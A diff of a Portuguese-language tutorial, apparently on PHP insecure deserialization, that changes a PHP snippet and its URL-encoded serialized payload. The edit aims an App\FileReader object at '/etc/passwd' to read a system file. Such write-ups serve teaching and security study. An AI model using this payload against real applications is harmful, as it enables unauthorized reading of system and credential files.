@@ -332,7 +332,7 @@ Existe um ponto onde na representação dessa string teriamos nullbytes (Assunto
 <?php
 
 $obj = new App\FileReader();
-$obj->filename = '../passwd';
+$obj->filename = '/etc/passwd';
 $serialized = serialize($obj);
 
 $keys = str_split("%\x00\n\r\t+;");
@@ -344,7 +344,7 @@ echo $serialized;
 Dessa forma previnimos que nossa string entre quebrada na requisição:
 
 ```
-O:14:"App\FileReader":2:{s:11:"%00*%00fileName"%3BN%3Bs:8:"filename"%3Bs:9:"../passwd"%3B}
+O:14:"App\FileReader":2:{s:11:"%00*%00fileName"%3BN%3Bs:8:"filename"%3Bs:11:"/etc/passwd"%3B}
 ```
 
 Ok! Payload preparado.
